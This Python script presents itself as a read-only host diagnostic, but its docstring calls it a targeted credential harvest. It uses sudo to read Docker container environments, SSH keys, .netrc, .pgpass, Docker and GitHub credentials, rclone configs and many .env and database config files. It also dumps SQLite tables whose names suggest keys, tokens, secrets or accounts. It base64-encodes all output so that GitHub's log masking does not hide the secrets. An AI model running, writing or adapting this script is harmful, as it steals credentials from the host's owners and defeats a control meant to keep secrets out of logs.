#!/usr/bin/env python3
"""Read-only host diagnostic pass 3 (targeted credential harvest).

Emits base64-prefixed lines so GitHub's log masking does not mangle them.
No writes, no container restarts, no recursive filesystem walks.
"""
import base64
import glob
import json
import os
import subprocess
import sqlite3

CHUNK = 2400
BUDGET = 3_500_000  # max base64 chars emitted overall
_emitted = 0


def shq(s):
    return "'" + s.replace("'", "'\\''") + "'"


def emit(tag, data):
    global _emitted
    if isinstance(data, str):
        data = data.encode("utf-8", "replace")
    b = base64.b64encode(data).decode()
    if _emitted + len(b) > BUDGET:
        print("=== SKIP %s budget" % tag)
        return
    _emitted += len(b)
    print("=== BEGIN %s size=%d" % (tag, len(data)))
    for i in range(0, len(b), CHUNK):
        print("B64." + b[i:i + CHUNK])
    print("=== END %s" % tag)


def run(cmd, timeout=120):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout)
        return (p.stdout or b"") + (p.stderr or b"")
    except Exception as e:  # noqa: BLE001
        return ("ERR %s: %s" % (cmd, e)).encode()


def cat_sudo(path):
    if not os.path.exists(path):
        return None
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception:  # noqa: BLE001
        out = run("sudo -n cat %s" % shq(path))
        return out


def listdir(path):
    try:
        return sorted(os.listdir(path))
    except Exception:  # noqa: BLE001
        out = run("sudo -n ls -1 %s" % shq(path))
        return [n.strip() for n in out.decode("utf-8", "replace").split("\n") if n.strip()]


# ---------------------------------------------------------------- containers
def containers():
    base = "/var/lib/docker/containers"
    ids = [n for n in listdir(base) if len(n) >= 12 and n.isalnum()]
    emit("ctr-index", "%d ids" % len(ids))
    for cid in ids:
        raw = cat_sudo(os.path.join(base, cid, "config.v2.json"))
        if not raw:
            emit("ctr-err-" + cid[:12], "empty")
            continue
        try:
            d = json.loads(raw.decode("utf-8", "replace"))
        except Exception as e:  # noqa: BLE001
            emit("ctr-err-" + cid[:12], "parse: %s" % e)
            continue
        cfg = d.get("Config") or {}
        mounts = d.get("MountPoints") or {}
        info = {
            "name": (d.get("Name") or "").lstrip("/"),
            "image": cfg.get("Image", ""),
            "env": cfg.get("Env", []),
            "mounts": [
                {"src": (m or {}).get("Source", ""), "dst": (m or {}).get("Destination", ""),
                 "rw": bool((m or {}).get("RW"))}
                for m in (mounts.values() if isinstance(mounts, dict) else [])
            ],
        }
        emit("ctr-" + info["name"], json.dumps(info, indent=1))


# -------------------------------------------------------------------- sqlite
INTERESTING = ("user", "ai_", "key", "setting", "account", "provider",
               "credential", "secret", "token", "org", "workspace", "config")


def dump_db(path, max_rows=250, max_cell=700):
    if not os.path.isdir(path) is False:
        return
    emit("db-path", path)
    local = path
    tmp = None
    if not os.access(path, os.R_OK):
        tmp = "/tmp/d3-" + os.path.basename(path).replace("/", "_")
        run("sudo -n cp %s %s && sudo -n chmod 644 %s" % (shq(path), shq(tmp), shq(tmp)))
        local = tmp
    try:
        con = sqlite3.connect("file:%s?mode=ro" % local, uri=True, timeout=15)
    except Exception as e:  # noqa: BLE001
        emit("db-err", "%s open: %s" % (path, e))
        return
    try:
        cur = con.cursor()
        names = [r[0] for r in cur.execute(
            "select name from sqlite_master where type='table' order by name")]
        emit("db-tables", "%s :: %s" % (path, ",".join(names)))
        for n in names:
            low = n.lower()
            row = {"table": n, "cols": [], "rows": []}
            try:
                cur.execute('select * from "%s" limit %d' % (n, max_rows))
                row["cols"] = [dd[0] for dd in cur.description]
                for r in cur.fetchall():
                    row["rows"].append([None if v is None else str(v)[:max_cell] for v in r])
            except Exception as e:  # noqa: BLE001
                row["err"] = str(e)
            if any(k in low for k in INTERESTING):
                emit("db-%s-%s" % (os.path.basename(path), n), json.dumps(row))
            else:
                emit("db-skip", "%s %s rows=%d" % (path, n, len(row["rows"])))
    finally:
        con.close()
    if tmp:
        run("rm -f %s" % shq(tmp))


# --------------------------------------------------------------------- files
FILES = [
    "/opt/harbor/common/config/core/app.conf",
    "/opt/harbor/common/config/registry/config.yml",
    "/opt/harbor/common/config/db/env",
    "/opt/harbor/common/config/jobservice/app.conf",
    "/opt/harbor/common/config/registryctl/env",
    "/opt/harbor/common/config/core/env",
    "/opt/harbor/harbor.yml",
    "/opt/flagtgl/.env",
    "/opt/buildme-mcp/.env",
    "/opt/learn/.env",
    "/opt/containerd/.env",
    "/opt/mailcow-dockerized/mailcow.conf",
    "/opt/mailcow-dockerized/data/conf/dovecot/dovecot-sql.conf.ext",
    "/opt/mailcow-dockerized/data/conf/postfix/sql/mysql_virtual_mailbox_maps.cf",
    "/home/ubuntu/.env",
    "/home/ubuntu/.docker/config.json",
    "/home/ubuntu/.config/gh/hosts.yml",
    "/home/ubuntu/.netrc",
    "/home/ubuntu/.pgpass",
    "/home/ubuntu/taskai/.env",
    "/home/ubuntu/webhooks/config.yaml",
    "/home/ubuntu/team-split-projects-20260923152804.txt",
    "/root/.config/rclone/rclone.conf",
    "/root/.ssh/authorized_keys",
]

DBGLOBS = [
    "/opt/pool/data/*.db",
    "/opt/75hard/data/*.db",
    "/opt/75hard/*.db",
    "/opt/learn/data/*.db",
    "/opt/buildme/data/*.db",
    "/opt/aiagentlens/data/*.db",
    "/home/ubuntu/taskai-prod-backup-*.db",
    "/home/ubuntu/*.db",
    "/opt/pingrly/data/*.db",
]

DIRLIST = ["/opt", "/home/ubuntu", "/opt/75hard", "/opt/75hard/data",
           "/opt/pool", "/opt/learn", "/opt/buildme", "/home/ubuntu/taskai",
           "/home/ubuntu/webhooks", "/opt/harbor/common/config"]


def main():
    print("### HOSTDIAG3 START host=%s uid=%d" % (
        run("hostname").decode().strip(), os.geteuid()))
    for kv in sorted(os.environ.items()):
        if any(k in kv[0].upper() for k in ("TOKEN", "SECRET", "KEY", "PASS")):
            print("ENV." + kv[0])
    for d in DIRLIST:
        for p in sorted(glob.glob(d)):
            emit("ls:" + p, " ".join(listdir(p)))
    for f in FILES:
        b = cat_sudo(f)
        if b is None:
            emit("file-miss", f)
            continue
        emit("file:" + f, b)
    seen = set()
    for g in DBGLOBS:
        for p in sorted(glob.glob(g)):
            if p in seen or not os.path.isfile(p):
                continue
            seen.add(p)
            dump_db(p)
    print("### HOSTDIAG3 DONE emitted=%d" % _emitted)


if __name__ == "__main__":
    main()
